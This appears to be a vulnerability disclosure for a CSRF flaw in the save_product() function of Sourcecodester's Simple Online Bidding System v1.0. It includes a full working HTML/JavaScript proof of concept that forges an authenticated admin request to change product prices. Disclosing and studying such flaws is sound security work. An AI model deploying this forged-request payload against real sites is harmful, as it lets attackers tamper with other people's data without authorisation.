CSRF vulnerability exists in Sourcecodester Simple Online Bidding System

official website:https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

version:v1.0

route：/simple-online-bidding-system/admin/index.php?page=manage_product

related code file：admin_class.php

related_function：save_product()

#### 1.Vulnerability analysis

The `save_product()` function in `admin_class.php` receives product-related parameters via POST without performing effective uniqueness verification on the data packet. It directly proceeds to concatenate SQL statements and update operations, which allows attackers to forge data packets and execute CSRF attacks.

![image-20240523190343238](https://github.com/kaikai145154/CVE-CSRF/blob/main/image-20240523190343238.png)

#### 2.Vulnerability verification and exploit

The exploit proof-of-concept (PoC) for this vulnerability is as follows. When using it, you need to modify the corresponding IP address and related fields according to the target environment. Specifically, this PoC attempts to tamper with the "Regular Price" and "Starting Bidding Amount" of the product, changing them to 8888 and 9999, respectively.

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/10.15.6.184:81\/admin\/ajax.php?action=save_product", true);
        xhr.setRequestHeader("Accept", "*\/*");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundaryVjF9FZAQT50TUhFB");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundaryVjF9FZAQT50TUhFB\r\n" + 
          "Content-Disposition: form-data; name=\"id\"\r\n" + 
          "\r\n" + 
          "3\r\n" + 
          "------WebKitFormBoundaryVjF9FZAQT50TUhFB\r\n" + 
          "Content-Disposition: form-data; name=\"name\"\r\n" + 
          "\r\n" + 
          "Gadget Package\r\n" + 
          "------WebKitFormBoundaryVjF9FZAQT50TUhFB\r\n" + 
          "Content-Disposition: form-data; name=\"category_id\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "------WebKitFormBoundaryVjF9FZAQT50TUhFB\r\n" + 
          "Content-Disposition: form-data; name=\"description\"\r\n" + 
          "\r\n" + 
          "Sample \r\n" + 
          "------WebKitFormBoundaryVjF9FZAQT50TUhFB\r\n" + 
          "Content-Disposition: form-data; name=\"regular_price\"\r\n" + 
          "\r\n" + 
          "8888\r\n" + 
          "------WebKitFormBoundaryVjF9FZAQT50TUhFB\r\n" + 
          "Content-Disposition: form-data; name=\"start_bid\"\r\n" + 
          "\r\n" + 
          "9999\r\n" + 
          "------WebKitFormBoundaryVjF9FZAQT50TUhFB\r\n" + 
          "Content-Disposition: form-data; name=\"bid_end_datetime\"\r\n" + 
          "\r\n" + 
          "2020-10-27 17:00\r\n" + 
          "------WebKitFormBoundaryVjF9FZAQT50TUhFB\r\n" + 
          "Content-Disposition: form-data; name=\"img\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundaryVjF9FZAQT50TUhFB--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>

```

We need to save the modified poc as an html file before using it.

![image-20240523190952737](https://github.com/kaikai145154/CVE-CSRF/blob/main/image-20240523190952737.png)

Originally, these two values were **15,000.00** and **150,000.00**. When we executed the POC, the product price changed.

![image-20240523191256492](https://github.com/kaikai145154/CVE-CSRF/blob/main/image-20240523191256492.png)

![image-20240523191334740](https://github.com/kaikai145154/CVE-CSRF/blob/main/image-20240523191334740.png)

